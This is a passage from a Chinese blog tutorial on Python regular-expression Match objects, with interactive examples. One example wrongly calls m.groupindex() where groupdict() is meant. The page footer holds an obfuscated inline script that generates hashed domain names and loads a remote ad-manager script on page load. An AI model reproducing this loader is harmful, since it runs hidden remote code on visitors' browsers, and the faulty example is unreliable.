<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><span style="font-family:Times New Roman"><strong style=""><span lang="EN-US">groups()</span></strong><span lang="EN-US"><span style="">               </span></span></span><span style="font-family:宋体">返回全部的组</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><span style="font-family:Times New Roman"><strong style=""><span lang="EN-US">groupdict()</span></strong><span lang="EN-US"><span style="">           </span></span></span><span style="font-family:宋体">返回以组名为</span><span lang="EN-US"><span style="font-family:Times New Roman">key</span></span><span style="font-family:宋体">，匹配的内容为</span><span lang="EN-US"><span style="font-family:Times New Roman">values</span></span><span style="font-family:宋体">的字典</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-family:宋体"><span style="font-size:16px">接上例：</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; m.groupindex()</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">{'age': '24', 'tel': '88888888', 'name': 'Tom'}</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><strong style=""><span lang="EN-US"><span style="font-family:Times New Roman">start( [group] )<span style="">     </span></span></span></strong><span style="font-family:宋体">获取匹配的组的开始位置</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><strong style=""><span lang="EN-US"><span style="font-family:Times New Roman">end( [group] )<span style="">              </span></span></span></strong><span style="font-family:宋体">获取匹配的组的结束位置</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><strong style=""><span lang="EN-US"><span style="font-family:Times New Roman">span( [group] ) <span style="">    </span></span></span></strong><span style="font-family:宋体">获取匹配的组的（开始，结束）位置</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><strong style=""><span lang="EN-US"><span style="font-family:Times New Roman">expand( template ) </span></span></strong><span style="font-family:宋体">根据一个模版用找到的内容替换模版里的相应位置</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">这个功能比较有趣，它根据一个模版来用匹配到的内容替换模版中的相应位置，组成一个新的字符串返回。它使用\</span><span lang="EN-US"><span style="font-family:Times New Roman">g&lt;index|name&gt;</span></span><span style="font-family:宋体">或</span><span lang="EN-US"><span style="font-family:Times New Roman"> \index </span></span><span style="font-family:宋体">来指示一个组。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-family:宋体"><span style="font-size:16px">接上例</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; m.expand(r'name is \g&lt;1&gt; , age is \g&lt;age&gt; , tel is \3')</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">'name is Tom , age is 24 , tel is 88888888'</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><strong style=""><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px"> </span></span></strong></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">除了以上这些函数外，</span><span lang="EN-US"><span style="font-family:Times New Roman">Match</span></span><span style="font-family:宋体">对象还有些属性</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><span style="font-family:Times New Roman"><strong style=""><span lang="EN-US">pos</span></strong><span lang="EN-US"><span style="">         </span></span></span><span style="font-family:宋体">搜索开始的位置参数</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><span style="font-family:Times New Roman"><strong style=""><span lang="EN-US">endpos</span></strong><span lang="EN-US"><span style="">  </span></span></span><span style="font-family:宋体">搜索结束的位置参数</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">这两个是使用</span><span lang="EN-US"><span style="font-family:Times New Roman">findall</span></span><span style="font-family:宋体">或</span><span lang="EN-US"><span style="font-family:Times New Roman">match</span></span><span style="font-family:宋体">等函数时，传入的参数。在上面这个例子里，我们没有指定开始和结束位置，那么缺省的开始位置就是</span><span lang="EN-US"><span style="font-family:Times New Roman">0,</span></span><span style="font-family:宋体">结束位置就是最后。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; m.pos</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">0</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; m.endpos</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">19</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><span style="font-family:宋体"><tt><strong><span lang="EN-US" style="">lastindex</span></strong></tt><tt><strong><span lang="EN-US" style="font-size:12pt"> </span></strong></tt><tt><span style="">最后匹配的组的序号<span lang="EN-US"></span></span></tt></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><tt><span lang="EN-US" style=""><span style="font-size:16px"><span style="font-family:宋体">&gt;&gt;&gt; m.lastindex</span></span></span></tt></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><tt><span lang="EN-US" style=""><span style="font-size:16px"><span style="font-family:宋体">3</span></span></span></tt></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><strong style=""><span lang="EN-US"><span style="font-family:Times New Roman">lastgroup<span style="">       </span></span></span></strong><span style="font-family:宋体">最后匹配的组名</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; m.lastgroup</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">'tel'</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><span style="font-family:Times New Roman"><strong style=""><span lang="EN-US">re</span></strong><span lang="EN-US"><span style="">    </span></span></span><span style="font-family:宋体">产生这个匹配的</span><span lang="EN-US"><span style="font-family:Times New Roman">Pattern</span></span><span style="font-family:宋体">对象，可以认为是个逆引用</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; m.re.pattern</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">'(?P&lt;name&gt;[a-z]+)\\s+(?P&lt;age&gt;\\d+)\\s+(?P&lt;tel&gt;\\d+).*'</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-family:宋体"><span style="font-size:16px">得到了产生这个匹配的规则</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><span style="font-family:宋体"><tt><strong><span lang="EN-US" style="">string<span style=""> </span></span></strong></tt><tt><span style="">匹配的目标字符串<span lang="EN-US"></span></span></tt></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><tt><span lang="EN-US" style=""><span style="font-size:16px"><span style="font-family:宋体">&gt;&gt;&gt; m.string</span></span></span></tt></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US" style=""><span style="font-size:16px"><span style="font-family:Times New Roman">'Tom 24 88888888<span style="">  </span>&lt;='</span></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US" style=""><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US" style=""><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US" style=""><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><strong style=""><span lang="EN-US" style=""><span style="font-family:Times New Roman">4 </span></span><span style="font-family:宋体">更多的资料</span><span lang="EN-US" style=""></span></strong></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-size:16px"><span style="font-family:宋体">以上基本上是把</span><span lang="EN-US" style=""><span style="font-family:Times New Roman">Python</span></span><span style="font-family:宋体">正则式的全面的介绍了一遍了。基本上是涵盖了</span><span lang="EN-US" style=""><span style="font-family:Times New Roman">Python</span></span><span style="font-family:宋体">帮助中有关正则式的全部内容。本来是想再多举点例子的，不过一来有点累了，二来觉得例子也举得够多的了，大家还是要靠自己多用多试，才能真正体会到</span><span lang="EN-US" style=""><span style="font-family:Times New Roman">Python </span></span><span style="font-family:宋体">正则式的精髓。</span><span lang="EN-US" style=""></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-size:16px"><span style="font-family:宋体">这篇文章只能算是个学习笔记。我本身也是个初学者，错漏的地方难免，所以最可靠的，还是</span><span lang="EN-US" style=""><span style="font-family:Times New Roman">Python</span></span><span style="font-family:宋体">自带的帮助。以及网络上寻找的一些资料。</span><span lang="EN-US" style=""></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-size:16px"><span style="font-family:宋体">写这篇文章的时候我参考了以下的资料</span><span lang="EN-US" style=""></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-size:16px"><span style="font-family:宋体">《</span><span lang="EN-US" style=""><span style="font-family:Times New Roman">Python</span></span><span style="font-family:宋体">正则表达式操作指南</span><span style="font-family:宋体">》</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US" style=""><a href="http://wiki.ubuntu.org.cn/index.php?title=Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97&amp;variant=zh-cn" rel="nofollow"><span style="font-family:Times New Roman; font-size:16px">http://wiki.ubuntu.org.cn/index.php?title=Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97&amp;variant=zh-cn</span></a></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US" style=""><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US" style=""><span style="font-size:16px"><span style="font-family:Times New Roman"><span style="">                                                                                                                               </span></span></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US" style=""><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US" style=""><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US" style=""><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US" style=""><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US" style=""><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US" style=""><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US" style=""><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US" style=""><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US" style=""><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US" style=""><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US" style=""><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US" style=""><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US" style=""><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US" style=""><span style="font-size:16px"><span style="font-family:Times New Roman"><span style="">                                                                                                                 </span>whycadi 2008.1.5</span></span></span></p>  
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/c837e5a54eed4b1417ea261779aec98d/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">raid 怎么改变 foreign 状态</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/17ac8e99c79904fd3570dd6e2b4c08a8/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">UNC地址</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>